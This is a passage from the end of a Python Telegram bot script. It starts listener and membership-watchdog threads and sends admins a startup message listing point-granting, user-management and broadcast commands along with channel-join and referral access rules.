    listener = threading.Thread(target=telegram_listener, daemon=True)
    listener.start()
    watchdog = threading.Thread(target=membership_watchdog, daemon=True)
    watchdog.start()
    start_msg = (
        "🤖 *Bot online*\n"
        "────────────────\n"
        "👑 Admins: " + ", ".join(f"`{a}`" for a in ADMIN_IDS) + "\n\n"
        "🛠 *Commands*\n"
        "🎁 `/grant <id> [points]` — grant points\n"
        "🎯 `/grantall <points>` — grant points to ALL members\n"
        "✅ `/add <id>` — approve (no free points)\n"
        "🗑 `/remove <id>` — revoke\n"
        "👥 `/list` — users\n"
        "📈 `/usage` — daily report\n"
        "📢 `/broadcast <msg>` — message all\n\n"
        "📌 *Access rules*\n"
        "• Join channels → auto-approved\n"
        f"• 1 successful refer = *{_fmt_reward()}*\n"
        "• Leave a channel → session stops\n\n"
        f"📁 Members: `{AUTHORIZED_USERS_FILE}`"
    )
    for aid in ADMIN_IDS:
        send_telegram(aid, start_msg, admin_keyboard())
    while True:
        time.sleep(1)


if __name__ == "__main__":
    main()
